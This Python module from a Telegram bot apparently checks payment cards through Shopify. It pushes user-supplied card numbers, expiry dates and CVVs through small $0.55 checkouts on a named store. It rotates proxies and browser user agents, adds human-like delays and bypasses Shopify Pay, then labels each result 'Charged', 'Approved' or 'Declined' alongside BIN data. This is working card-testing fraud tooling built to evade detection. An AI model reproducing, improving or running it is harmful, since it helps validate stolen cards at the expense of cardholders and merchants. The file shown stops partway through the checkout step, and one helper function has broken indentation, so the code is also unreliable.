# BOT/gates/charge/shopify/shopify.py
# Shopify Charge Gateway - FIXED CHECKOUT STRUCTURE WITH DYNAMIC PRICE

import json
import asyncio
import re
import time
import httpx
import random
import string
from decimal import Decimal
from datetime import datetime
from pyrogram import Client, filters
from pyrogram.types import Message
import html
import os
from urllib.parse import urlparse, parse_qs, urlencode, unquote
from BOT.helper.permissions import auth_and_free_restricted
from BOT.helper.start import load_users, save_users

# Import from Admins module for command status
try:
    from BOT.helper.Admins import is_command_disabled, get_command_offline_message
except ImportError:
    def is_command_disabled(command_name: str) -> bool:
        return False

    def get_command_offline_message(command_name: str) -> str:
        return "Command is temporarily disabled."

# Import universal charge processor
try:
    from BOT.gc.credit import charge_processor
    CHARGE_PROCESSOR_AVAILABLE = True
except ImportError:
    charge_processor = None
    CHARGE_PROCESSOR_AVAILABLE = False

# Import proxy system
try:
    from BOT.tools.proxy import get_proxy_for_user, mark_proxy_success, mark_proxy_failed
    PROXY_ENABLED = True
except ImportError:
    PROXY_ENABLED = False

# Import bin details function
try:
    from TOOLS.getbin import get_bin_details
except ImportError:
    def get_bin_details(bin_number):
        return {}

# Enhanced Custom logger with detailed console logging
class ConsoleLogger:
    def __init__(self, user_id=None):
        self.user_id = user_id
        self.check_id = f"SHOP-{random.randint(1000, 9999)}"
        self.start_time = None
        self.step_counter = 0
        
    def start_check(self, card_details):
        """Start a new check session"""
        self.start_time = time.time()
        self.step_counter = 0
        cc = card_details.split('|')[0] if '|' in card_details else card_details
        masked_cc = cc[:6] + "******" + cc[-4:] if len(cc) > 10 else cc
        
        print("\n" + "="*80)
        print(f"🛒 [SHOPIFY CHARGE PROCESS STARTED]")
        print(f"   ├── Check ID: {self.check_id}")
        print(f"   ├── User ID: {self.user_id or 'N/A'}")
        print(f"   ├── Card: {masked_cc}")
        print(f"   └── Start Time: {datetime.now().strftime('%H:%M:%S')}")
        print("="*80 + "\n")
    
    def step(self, step_num, step_name, description, status="PROCESSING"):
        """Log a step in the process"""
        self.step_counter += 1
        elapsed = time.time() - self.start_time if self.start_time else 0
        
        status_emoji = {
            "PROCESSING": "🔄",
            "SUCCESS": "✅",
            "FAILED": "❌",
            "WARNING": "⚠️",
            "INFO": "ℹ️"
        }.get(status, "➡️")
        
        print(f"{status_emoji} STEP {step_num:02d}: {step_name}")
        print(f"   ├── Description: {description}")
        print(f"   ├── Elapsed: {elapsed:.2f}s")
        print(f"   └── Timestamp: {datetime.now().strftime('%H:%M:%S.%f')[:-3]}")
        print()
        
        return elapsed
    
    def sub_step(self, step_num, sub_step, description, details=None):
        """Log a sub-step"""
        elapsed = time.time() - self.start_time if self.start_time else 0
        print(f"   │   ├── {step_num}.{sub_step}: {description}")
        if details:
            print(f"   │   │   └── {details}")
    
    def request_details(self, method, url, status_code, response_time, details=None):
        """Log HTTP request details"""
        elapsed = time.time() - self.start_time if self.start_time else 0
        print(f"   │   ├── HTTP {method} {url}")
        print(f"   │   │   ├── Status: {status_code}")
        print(f"   │   │   ├── Response Time: {response_time:.2f}s")
        print(f"   │   │   ├── Total Elapsed: {elapsed:.2f}s")
        if details:
            print(f"   │   │   └── Details: {details}")
    
    def extracted_data(self, data_type, data_value):
        """Log extracted data"""
        print(f"   │   ├── Extracted {data_type}: {data_value}")
    
    def error_detail(self, error_message, error_type="ERROR"):
        """Log error details"""
        error_emoji = "❌" if error_type == "ERROR" else "⚠️"
        print(f"{error_emoji} ERROR DETAIL: {error_message}")
    
    def result(self, success, message, final_status, response_time):
        """Log final result"""
        result_emoji = "✅" if success else "❌"
        result_text = "SUCCESS" if success else "FAILED"
        
        print("\n" + "="*80)
        print(f"{result_emoji} [SHOPIFY CHARGE PROCESS COMPLETED]")
        print(f"   ├── Check ID: {self.check_id}")
        print(f"   ├── Result: {result_text}")
        print(f"   ├── Final Status: {final_status}")
        print(f"   ├── Response: {message[:100]}{'...' if len(message) > 100 else ''}")
        print(f"   ├── Total Steps: {self.step_counter}")
        print(f"   ├── Total Time: {response_time:.2f}s")
        print(f"   └── End Time: {datetime.now().strftime('%H:%M:%S')}")
        print("="*80 + "\n")

# Create global logger instance
logger = ConsoleLogger()

def load_owner_id():
    try:
        with open("FILES/config.json", "r") as f:
            config_data = json.load(f)
            return config_data.get("OWNER")
    except:
        return None

def get_user_plan(user_id):
    users = load_users()
    user_id_str = str(user_id)
    if user_id_str in users:
        return users[user_id_str].get("plan", {})
    return {}

def is_user_banned(user_id):
    try:
        if not os.path.exists("DATA/banned_users.txt"):
            return False

        with open("DATA/banned_users.txt", "r") as f:
            banned_users = f.read().splitlines()

        return str(user_id) in banned_users
    except:
        return False

def check_cooldown(user_id, command_type="sh"):
    """Check cooldown for user - SKIP FOR OWNER"""
    owner_id = load_owner_id()
    
    # Skip cooldown check for owner
    if str(user_id) == str(owner_id):
        return True, 0

    try:
        with open("DATA/cooldowns.json", "r") as f:
            cooldowns = json.load(f)
    except:
        cooldowns = {}

    user_key = f"{user_id}_{command_type}"
    current_time = time.time()

    if user_key in cooldowns:
        last_time = cooldowns[user_key]
        user_plan = get_user_plan(user_id)
        antispam = user_plan.get("antispam", 15)

        if antispam is None:
            antispam = 15

        if current_time - last_time < antispam:
            return False, antispam - (current_time - last_time)

    cooldowns[user_key] = current_time
    try:
        with open("DATA/cooldowns.json", "w") as f:
            json.dump(cooldowns, f, indent=4)
    except:
        pass

    return True, 0

def format_shopify_response(cc, mes, ano, cvv, raw_response, timet, profile, user_data):
    """Format response exactly like response.py - IMPROVED STATUS DETECTION"""
    fullcc = f"{cc}|{mes}|{ano}|{cvv}"

    # Extract user_id from profile
    try:
        user_id = str(user_data.get("user_id", "Unknown"))
    except Exception:
        user_id = None

    # Load gateway from DATA/sites.json
    try:
        with open("DATA/sites.json", "r") as f:
            sites = json.load(f)
        gateway = sites.get(user_id, {}).get("gate", "Shopify Self Site 💷")
    except Exception:
        gateway = "Shopify Self Site 💷"

    # Clean response
    raw_response = str(raw_response) if raw_response else "-"

    # Determine status - IMPROVED LOGIC
    raw_response_upper = raw_response.upper()
    
    # Check for successful charges
    if any(keyword in raw_response_upper for keyword in [
        "ORDER_PLACED", "SUBMITSUCCESS", "SUCCESSFUL", "APPROVED", "RECEIPT"
    ]):
        status_flag = "Charged 💎"
    # Check for OTP/3D Secure
    elif any(keyword in raw_response_upper for keyword in [
        "3D", "AUTHENTICATION", "OTP", "VERIFICATION", "CVV-MATCH-OTP", 
        "3DS", "PENDING", "SECURE REQUIRED"
    ]):
        status_flag = "Approved ❎"
    # Check for address/ZIP issues (these are often approved but need verification)
    elif any(keyword in raw_response_upper for keyword in [
        "ADDRESS", "ZIP", "AVS", "VERIFICATION FAILED", "MISMATCHED"
    ]):
        status_flag = "Approved ❎"
    # Check for CAPTCHA
    elif "CAPTCHA" in raw_response_upper:
        status_flag = "Captcha ⚠️"
    # Check for rate limiting
    elif any(keyword in raw_response_upper for keyword in [
        "RATE LIMITED", "THROTTLED", "LIMIT EXCEEDED"
    ]):
        status_flag = "Rate Limit ⏰"
    # Check for specific decline reasons
    elif any(keyword in raw_response_upper for keyword in [
        "INSUFFICIENT FUNDS", "INVALID CVC", "INCORRECT CVC", 
        "YOUR CARD DOES NOT SUPPORT", "CARD DECLINED", "DECLINED", 
        "FAILED", "EXPIRED", "INVALID CARD", "DO NOT HONOR"
    ]):
        status_flag = "Declined ❌"
    # Default to declined
    else:
        status_flag = "Declined ❌"

    # BIN lookup
    bin_data = get_bin_details(cc[:6]) or {}
    bin_info = {
        "bin": bin_data.get("bin", cc[:6]),
        "country": bin_data.get("country", "Unknown"),
        "flag": bin_data.get("flag", "🏳️"),
        "vendor": bin_data.get("vendor", "Unknown"),
        "type": bin_data.get("type", "Unknown"),
        "level": bin_data.get("level", "Unknown"),
        "bank": bin_data.get("bank", "Unknown")
    }

    # User Plan
    try:
        plan = user_data.get("plan", {}).get("plan", "Free")
        badge = user_data.get("plan", {}).get("badge", "🎭")
        first_name = user_data.get("first_name", "User")
    except Exception:
        plan = "Free"
        badge = "🎭"
        first_name = "User"

    # Clean name
    clean_name = re.sub(r'[↑←«~∞🏴]', '', first_name).strip()
    profile_display = f"『{badge}』{clean_name}"

    # Final formatted message - ALWAYS SHOW 0.55$ IN UI
    result = f"""
<b>[#Shopify Charge] | WAYNE</b> ✦
━━━━━━━━━━━━━━━
<b>[•] Card</b>- <code>{fullcc}</code>
<b>[•] Gateway</b> - <b>Shopify Charge 0.55$</b>
<b>[•] Status</b>- <code>{status_flag}</code>
<b>[•] Response</b>- <code>{raw_response}</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[+] Bin</b>: <code>{bin_info['bin']}</code>  
<b>[+] Info</b>: <code>{bin_info['vendor']} - {bin_info['type']} - {bin_info['level']}</code> 
<b>[+] Bank</b>: <code>{bin_info['bank']}</code> 🏦
<b>[+] Country</b>: <code>{bin_info['country']} - [{bin_info['flag']}]</code>
━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━
<b>[ﾒ] Checked By</b>: {profile_display} [<code>{plan} {badge}</code>]
<b>[ϟ] Dev</b> ➺</b> <b><i>DADYY</i></b>
━━━━━━━━━━━━━━━
<b>[ﾒ] T/t</b>: <code>[{timet:.2f} 𝐬]</code> <b>|P/x:</b> [<code>Live ⚡️</code>]
"""
    return result

class ShopifyChargeChecker:
    def __init__(self, user_id=None):
        # Modern browser user agents
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
        ]
        self.user_agent = random.choice(self.user_agents)
        self.base_url = "https://meta-app-prod-store-1.myshopify.com"
        self.product_url = f"{self.base_url}/products/retailer-id-fix-no-mapping"
        self.user_id = user_id
        self.current_proxy = None
        
        # Dynamic data that needs to be fetched per session
        self.cookies = {}
        self.checkout_token = None
        self.x_checkout_one_session_token = None
        self.x_checkout_web_build_id = None
        self.variant_id = None
        self.product_id = None
        self.product_price = None  # Store actual product price (0.55$ or dynamic)
        self.shop_id = None
        
        # CORRECTED addresses from your instructions - FOR PICKUP
        self.shipping_address = {
            "first_name": "Paris",
            "last_name": "Hilton",
            "address1": "8 Log Pond Drive",
            "address2": "",
            "city": "Horsham",
            "province": "PA",
            "zip": "19044",
            "country": "US",
            "phone": "5551234567",
            "email": "brucewayne0002@gmail.com"
        }
        
        # Random billing name as per instructions - for cardholder name
        self.random_first_name = self.generate_random_name()
        self.random_last_name = self.generate_random_name()
        
        # Billing address - same as pickup address but with random name
        self.billing_address = {
            "first_name": self.random_first_name,
            "last_name": self.random_last_name,
            "address1": "8 Log Pond Drive",
            "address2": "",
            "city": "Horsham",
            "province": "PA",
            "zip": "19044",
            "country": "US",
            "phone": "5551234567"
        }
        
        # Initialize with proxy if available
        if PROXY_ENABLED and user_id:
            self.current_proxy = get_proxy_for_user(user_id, "random")
            if self.current_proxy:
                print(f"🔄 PROXY: Using proxy: {self.current_proxy[:50]}...")
        
        # Initialize console logger
        self.console_logger = ConsoleLogger(user_id)
    
    def generate_random_name(self):
        """Generate random first and last name"""
        first_names = ["John", "Michael", "David", "James", "Robert", "William", "Richard", "Joseph", "Thomas", "Charles"]
        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez"]
        return random.choice(first_names)
    
    def get_base_headers(self):
        """Get base headers for browser-like requests"""
        return {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'en-US,en;q=0.9',
            'Cache-Control': 'no-cache',
            'Connection': 'keep-alive',
            'DNT': '1',
            'Pragma': 'no-cache',
            'Sec-CH-UA': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
            'Sec-CH-UA-Mobile': '?0',
            'Sec-CH-UA-Platform': '"Windows"',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': self.user_agent
        }
        
    async def make_request(self, client, method, url, **kwargs):
        """Make request with proxy support and error handling"""
        try:
            # Add headers if not present
            if 'headers' not in kwargs:
                kwargs['headers'] = self.get_base_headers()
            
            # Add timeout if not present
            if 'timeout' not in kwargs:
                kwargs['timeout'] = 30.0
            
            # Add cookies if we have them
            if self.cookies and 'cookies' not in kwargs:
                kwargs['cookies'] = self.cookies
            
            # Make request
            start_time = time.time()
            response = await client.request(method, url, **kwargs)
            response_time = time.time() - start_time
            
            # Update proxy stats if proxy was used
            if self.current_proxy and PROXY_ENABLED:
                if response.status_code < 400:
                    mark_proxy_success(self.current_proxy, response_time)
                else:
                    mark_proxy_failed(self.current_proxy)
            
            # Update cookies from response
            if 'set-cookie' in response.headers:
                cookies_to_update = response.headers.get_list('set-cookie')
                for cookie in cookies_to_update:
                    # Parse cookie
                    if '=' in cookie:
                        name_value = cookie.split(';')[0]
                        if '=' in name_value:
                            name, value = name_value.split('=', 1)
                            self.cookies[name] = value
            
            return response
            
        except Exception as e:
            # Update proxy stats on failure
            if self.current_proxy and PROXY_ENABLED:
                mark_proxy_failed(self.current_proxy)
            print(f"❌ Request error for {url}: {str(e)}")
            raise e
            
    async def human_delay(self, min_delay=1, max_delay=3):
        """Simulate human delay between actions"""
        delay = random.uniform(min_delay, max_delay)
        await asyncio.sleep(delay)
        
    async def load_homepage(self, client):
        """Load homepage to get initial cookies and shop info"""
        try:
            elapsed = self.console_logger.step(1, "LOAD HOMEPAGE", "Loading homepage for initial cookies")
            
            response = await self.make_request(
                client, 'GET', self.base_url
            )
            
            self.console_logger.request_details("GET", self.base_url, response.status_code, 
                                              time.time() - (self.console_logger.start_time + elapsed))
            
            if response.status_code in [200, 304]:
                self.console_logger.sub_step(1, 1, "Homepage loaded successfully")
                self.console_logger.step(1, "LOAD HOMEPAGE", "Homepage loaded", "SUCCESS")
                return True
            else:
                self.console_logger.error_detail(f"Failed to load homepage: {response.status_code}")
                return False
                
        except Exception as e:
            self.console_logger.error_detail(f"Homepage error: {str(e)}")
            return False
        
    async def load_product_page(self, client):
        """Load product page and extract dynamic data INCLUDING PRICE - FIXED FOR 0.55$"""
        try:
            elapsed = self.console_logger.step(2, "LOAD PRODUCT PAGE", "Loading product page and extracting price")
            
            response = await self.make_request(
                client, 'GET', self.product_url
            )
            
            self.console_logger.request_details("GET", self.product_url, response.status_code,
                                              time.time() - (self.console_logger.start_time + elapsed))
            
            if response.status_code in [200, 304]:
                html_content = response.text
                
                self.console_logger.sub_step(2, 1, f"HTML length: {len(html_content)} chars")
                
                # Extract variant ID using multiple patterns
                variant_patterns = [
                    r'/variants/(\d+)/',
                    r'name="id"[^>]*value="(\d+)"',
                    r'id["\']?\s*:\s*["\']?(\d+)["\']',
                    r'data-variant-id="(\d+)"',
                    r'"variants"\s*:\s*\[[^\]]*"id"\s*:\s*(\d+)',
                ]
                
                for i, pattern in enumerate(variant_patterns):
                    match = re.search(pattern, html_content)
                    if match:
                        variant_id = match.group(1)
                        self.console_logger.sub_step(2, 2, f"Method {i+1} found variant: {variant_id}")
                        if variant_id.isdigit() and len(variant_id) > 5:
                            self.variant_id = variant_id
                            self.console_logger.extracted_data("Variant ID", self.variant_id)
                            break
                
                # If still no variant found, use the one from logs
                if not self.variant_id:
                    self.variant_id = "43207284392098"
                    self.console_logger.sub_step(2, 3, "Using default variant ID from logs: 43207284392098")
                    self.console_logger.extracted_data("Variant ID", self.variant_id)
                
                # Extract product ID if available
                product_patterns = [
                    r'product-id["\']?\s*:\s*["\']?(\d+)',
                    r'data-product-id="(\d+)"',
                    r'productId["\']?\s*:\s*["\']?(\d+)'
                ]
                
                for pattern in product_patterns:
                    match = re.search(pattern, html_content)
                    if match:
                        self.product_id = match.group(1)
                        self.console_logger.extracted_data("Product ID", self.product_id)
                        break
                
                if not self.product_id:
                    self.product_id = "7890988171426"
                    self.console_logger.sub_step(2, 4, "Using default product ID from logs")
                
                # EXTRACT PRODUCT PRICE - SPECIFICALLY LOOK FOR 0.55 OR SIMILAR LOW PRICE
                price_patterns = [
                    r'"price"\s*:\s*"?(\d+\.\d{2})"?',
                    r'data-price="(\d+\.\d{2})"',
                    r'content="\$(\d+\.\d{2})"',
                    r'price["\']?\s*:\s*["\']?(\d+\.\d{2})["\']?',
                    r'<span[^>]*class="[^"]*price[^"]*"[^>]*>\s*[\$€£]?\s*(\d+\.\d{2})',
                    r'<meta[^>]*content="\$(\d+\.\d{2})"[^>]*property="og:price:amount"',
                    r'"amount"\s*:\s*(\d+\.\d{2})'
                ]
                
                # First try to find low prices (0.55, 0.58, etc.)
                found_low_price = False
                for pattern in price_patterns:
                    matches = re.findall(pattern, html_content)
                    for match in matches:
                        try:
                            price = float(match)
                            # Look for prices around 0.55 (0.50-0.60 range)
                            if 0.50 <= price <= 0.60:
                                self.product_price = price
                                self.console_logger.sub_step(2, 5, f"Found low product price: ${price:.2f}")
                                found_low_price = True
                                break
                        except:
                            continue
                    if found_low_price:
                        break
                
                # If no low price found, look for any price
                if not found_low_price:
                    for pattern in price_patterns:
                        matches = re.findall(pattern, html_content)
                        for match in matches:
                            try:
                                price = float(match)
                                if price > 0:
                                    self.product_price = price
                                    self.console_logger.sub_step(2, 6, f"Found alternative price: ${price:.2f}")
                                    break
                            except:
                                continue
                        if self.product_price:
                            break
                
                # If price still not found, use default 0.55
                if not self.product_price:
                    self.product_price = 0.55
                    self.console_logger.sub_step(2, 7, "Using default price: $0.55")
                
                self.console_logger.step(2, "LOAD PRODUCT PAGE", "Product page loaded", "SUCCESS")
                return True
            else:
                self.console_logger.error_detail(f"Failed to load product page: {response.status_code}")
                return False
                
        except Exception as e:
            self.console_logger.error_detail(f"Product page error: {str(e)}")
            return False
            
    async def add_to_cart(self, client):
        """Add product to cart using extracted variant ID"""
        try:
            elapsed = self.console_logger.step(3, "ADD TO CART", "Adding product to cart")
            
            variant_id = self.variant_id if self.variant_id else "43207284392098"
            
            add_to_cart_url = f"{self.base_url}/cart/add"
            
            headers = {
                'Accept': 'application/javascript, */*; q=0.01',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Accept-Language': 'en-US,en;q=0.9',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': self.base_url,
                'Referer': self.product_url,
                'Sec-CH-UA': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
                'Sec-CH-UA-Mobile': '?0',
                'Sec-CH-UA-Platform': '"Windows"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': self.user_agent,
                'X-Requested-With': 'XMLHttpRequest'
            }
            
            # Form data with all required fields
            data = {
                'quantity': '1',
                'id': variant_id,
                'form_type': 'product',
                'utf8': '✓'
            }
            
            response = await client.post(
                add_to_cart_url,
                headers=headers,
                data=data,
                cookies=self.cookies,
                timeout=30.0
            )
            
            self.console_logger.request_details("POST", add_to_cart_url, response.status_code,
                                              time.time() - (self.console_logger.start_time + elapsed),
                                              f"Variant: {variant_id}")
            
            if response.status_code == 200:
                self.console_logger.sub_step(3, 2, "Product added to cart successfully")
                self.console_logger.step(3, "ADD TO CART", "Product added to cart", "SUCCESS")
                return True
            else:
                error_text = response.text[:500] if response.text else "No response text"
                self.console_logger.error_detail(f"Add to cart failed. Status: {response.status_code}")
                self.console_logger.error_detail(f"Error response: {error_text}")
                return False
                
        except Exception as e:
            self.console_logger.error_detail(f"Add to cart error: {str(e)}")
            return False
    
    async def go_to_cart_page(self, client):
        """Go to cart page"""
        try:
            elapsed = self.console_logger.step(4, "GO TO CART", "Loading cart page")
            
            response = await self.make_request(
                client, 'GET', f"{self.base_url}/cart"
            )
            
            self.console_logger.request_details("GET", f"{self.base_url}/cart", response.status_code,
                                              time.time() - (self.console_logger.start_time + elapsed))
            
            if response.status_code in [200, 304]:
                self.console_logger.sub_step(4, 1, "Cart page loaded successfully")
                self.console_logger.step(4, "GO TO CART", "Cart page loaded", "SUCCESS")
                return True
            else:
                self.console_logger.error_detail(f"Failed to load cart page: {response.status_code}")
                return False
                
        except Exception as e:
            self.console_logger.error_detail(f"Cart page error: {str(e)}")
            return False
    
    async def go_to_checkout(self, client):
        """Go to checkout page and extract checkout token"""
        try:
            elapsed = self.console_logger.step(5, "GO TO CHECKOUT", "Proceeding to checkout")
            
            checkout_url = f"{self.base_url}/cart"
            
            headers = {
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                'Accept-Encoding': 'gzip, deflate, br, zstd',
                'Accept-Language': 'en-US,en;q=0.9',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': self.base_url,
                'Referer': f"{self.base_url}/cart",
                'Sec-CH-UA': '"Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"',
                'Sec-CH-UA-Mobile': '?0',
                'Sec-CH-UA-Platform': '"Windows"',
                'Sec-Fetch-Dest': 'document',
                'Sec-Fetch-Mode': 'navigate',
                'Sec-Fetch-Site': 'same-origin',
                'Sec-Fetch-User': '?1',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': self.user_agent
            }
            
            data = {
                'updates[]': '1',
                'checkout': ''
            }
            
            # Make the POST request WITHOUT following redirects
            response = await client.post(
                checkout_url,
                headers=headers,
                data=data,
                cookies=self.cookies,
                timeout=30.0,
                follow_redirects=False
            )
            
            self.console_logger.request_details("POST", checkout_url, response.status_code,
                                              time.time() - (self.console_logger.start_time + elapsed),
                                              "Proceeding to checkout")
            
            if response.status_code in [302, 303]:
                location = response.headers.get('location', '')
                
                if location:
                    self.console_logger.sub_step(5, 1, f"Redirect location: {location[:100]}...")
                    
                    # Check if we're being redirected to shop.app (Shopify Pay)
                    if 'shop.app' in location:
                        self.console_logger.sub_step(5, 2, "Detected shop.app redirect (Shopify Pay)")
                        
                        # Extract checkout token from shop.app URL
                        checkout_token = None
                        
                        # Method 1: Extract from shop.app URL
                        if '/cn/' in location:
                            cn_match = re.search(r'/cn/([^/]+)', location)
                            if cn_match:
                                checkout_token = cn_match.group(1)
                                self.console_logger.sub_step(5, 3, f"Extracted token from URL: {checkout_token}")
                        
                        # Method 2: Try to get from cart cookie
                        if not checkout_token and 'cart' in self.cookies:
                            cart_value = self.cookies.get('cart', '')
                            if cart_value:
                                parts = cart_value.split('?')
                                if parts and parts[0]:
                                    checkout_token = parts[0]
                                    self.console_logger.sub_step(5, 4, f"Extracted token from cookie: {checkout_token}")
                        
                        if checkout_token:
                            self.checkout_token = checkout_token
                            self.console_logger.extracted_data("Checkout Token", self.checkout_token)
                            
                            # Build the direct checkout URL with skip_shop_pay parameter
                            direct_checkout_url = f"{self.base_url}/checkouts/cn/{self.checkout_token}/en-us?skip_shop_pay=true&__r=1&_r=AQAB{random.randint(1000000, 9999999)}"
                            self.console_logger.sub_step(5, 5, f"Direct checkout URL: {direct_checkout_url[:80]}...")
                            
                            self.console_logger.step(5, "GO TO CHECKOUT", "Checkout token extracted", "SUCCESS")
                            return True, direct_checkout_url
                        else:
                            self.console_logger.error_detail("Failed to extract checkout token from shop.app redirect")
                            return False, "Failed to extract checkout token from shop.app redirect"
                    
                    # Normal redirect to merchant domain
                    elif self.base_url in location:
                        # Extract checkout token from URL
                        if '/checkouts/cn/' in location:
                            match = re.search(r'/checkouts/cn/([^/]+)', location)
                            if match:
                                self.checkout_token = match.group(1)
                                self.console_logger.extracted_data("Checkout Token from URL", self.checkout_token)
                        
                        # Add skip_shop_pay parameter to bypass Shopify Pay
                        if '?' in location:
                            location += '&skip_shop_pay=true'
                        else:
                            location += '?skip_shop_pay=true'
                        
                        self.console_logger.sub_step(5, 6, f"Merchant redirect: {location[:80]}...")
                        self.console_logger.step(5, "GO TO CHECKOUT", "Redirected to merchant checkout", "SUCCESS")
                        return True, location
                
                # If no location, try to extract from response
                if not location:
                    self.console_logger.sub_step(5, 7, "No redirect location, checking response...")
                    
                    # Try to find checkout token in response body
                    response_text = response.text
                    checkout_patterns = [
                        r'/checkouts/cn/([^/"]+)',
                        r'checkoutToken["\']?\s*:\s*["\']([^"\']+)',
                        r'checkout_url["\']?\s*:\s*["\'][^"\']*/([^/?"\']+)',
                        r'data-checkout-token=["\']([^"\']+)["\']'
                    ]
                    
                    for pattern in checkout_patterns:
                        match = re.search(pattern, response_text)
                        if match:
                            self.checkout_token = match.group(1)
                            self.console_logger.extracted_data("Checkout Token from Response Body", self.checkout_token)
                            
                            direct_url = f"{self.base_url}/checkouts/cn/{self.checkout_token}/en-us?skip_shop_pay=true&__r=1&_r=AQAB{random.randint(1000000, 9999999)}"
                            return True, direct_url
            
            # If we get here without success
            self.console_logger.error_detail(f"Failed to extract checkout token. Status: {response.status_code}")
            return False, "Failed to extract checkout token"
                
        except Exception as e:
            self.console_logger.error_detail(f"Checkout error: {str(e)}")
            return False, f"Checkout error: {str(e)[:80]}"
    
    async def load_checkout_page_with_redirects(self, client, checkout_url):
        """Load checkout page with proper redirect handling and extract tokens - FIXED VERSION"""
        try:
            elapsed = self.console_logger.step(6, "LOAD CHECKOUT PAGE", "Loading checkout page for tokens")
            
            max_redirects = 5
            current_url = checkout_url
            response = None
            
            for i in range(max_redirects):
                self.console_logger.sub_step(6, i+1, f"Attempt {i+1}: {current_url[:100]}...")
                
                # Make request with full headers for checkout page
                headers = self.get_base_headers()
                headers.update({
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'Referer': f'{self.base_url}/cart',
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'same-origin',
                    'Sec-Fetch-User': '?1',
                    'Upgrade-Insecure-Requests': '1'
                })
                
                response = await client.get(
                    current_url,
                    headers=headers,
                    cookies=self.cookies,
                    timeout=30.0,
                    follow_redirects=False
                )
                
                if response.status_code in [200, 201]:
                    self.console_logger.sub_step(6, i+2, f"Successfully loaded checkout page after {i+1} attempt(s)")
                    break
                elif response.status_code in [301, 302, 303, 307, 308]:
                    location = response.headers.get('location', '')
                    if location:
                        # Handle relative URLs
                        if location.startswith('/'):
                            parsed_url = urlparse(current_url)
                            location = f"{parsed_url.scheme}://{parsed_url.netloc}{location}"
                        current_url = location
                        self.console_logger.sub_step(6, i+3, f"Following redirect to: {location[:100]}...")
                        await asyncio.sleep(0.5)
                    else:
                        self.console_logger.error_detail("Redirect without location header")
                        break
                else:
                    self.console_logger.error_detail(f"Unexpected status code: {response.status_code}")
                    break
            
            if not response or response.status_code not in [200, 201]:
                self.console_logger.error_detail(f"Failed to load checkout page after {max_redirects} attempts")
                return False
            
            html_content = response.text
            self.console_logger.sub_step(6, 4, f"HTML content length: {len(html_content)} chars")
            
            # Extract session token from the checkout page HTML
            session_token_patterns = [
                r'"sessionToken"\s*:\s*"([^"]+)"',
                r'sessionToken["\']?\s*:\s*["\']([^"\']+)',
                r'window\.__remixContext\s*=\s*{.*?"sessionToken"\s*:\s*"([^"]+)"',
                r'<script[^>]*id="__NEXT_DATA__"[^>]*>(.*?)</script>',
                r'"checkout_session_token"\s*:\s*"([^"]+)"',
                r'"token"\s*:\s*"([^"]+)"',
            ]
            
            session_token_found = False
            for idx, pattern in enumerate(session_token_patterns):
                matches = re.findall(pattern, html_content, re.DOTALL)
                for match in matches:
                    if isinstance(match, tuple):
                        match = match[0]
                    token = str(match).strip()
                    # Validate token format (should be long base64-like string)
                    if len(token) > 100 and any(char in token for char in ['-', '_']):
                        self.x_checkout_one_session_token = token
                        self.console_logger.sub_step(6, 5, f"Pattern {idx+1} found session token: {token[:50]}...")
                        session_token_found = True
                        break
                if session_token_found:
                    break
            
            # If still not found, try a different approach - look for it in script data
            if not session_token_found:
                # Look for JSON data in script tags
                script_pattern = r'<script[^>]*type=["\']application/json["\'][^>]*>(.*?)</script>'
                script_matches = re.findall(script_pattern, html_content, re.DOTALL)
                for script_data in script_matches:
                    try:
                        data = json.loads(script_data)
                        # Search recursively in JSON
                        def find_token_in_dict(d):
                            if isinstance(d, dict):
                                for key, value in d.items():
                                    if isinstance(value, str) and len(value) > 100 and 'sessionToken' in key:
                                        return value
                                    elif isinstance(value, (dict, list)):
                                        result = find_token_in_dict(value)
                                        if result:
                                            return result
                            elif isinstance(d, list):
                                for item in d:
                                    result = find_token_in_dict(item)
                                        if result:
                                            return result
                            return None
                        
                        token = find_token_in_dict(data)
                        if token:
                            self.x_checkout_one_session_token = token
                            self.console_logger.sub_step(6, 6, f"Found session token in JSON data: {token[:50]}...")
                            session_token_found = True
                            break
                    except:
                        pass
            
            if not session_token_found:
                self.console_logger.error_detail("Failed to extract session token from checkout page")
                return False
            
            self.console_logger.extracted_data("Session Token", f"{self.x_checkout_one_session_token[:50]}...")
            
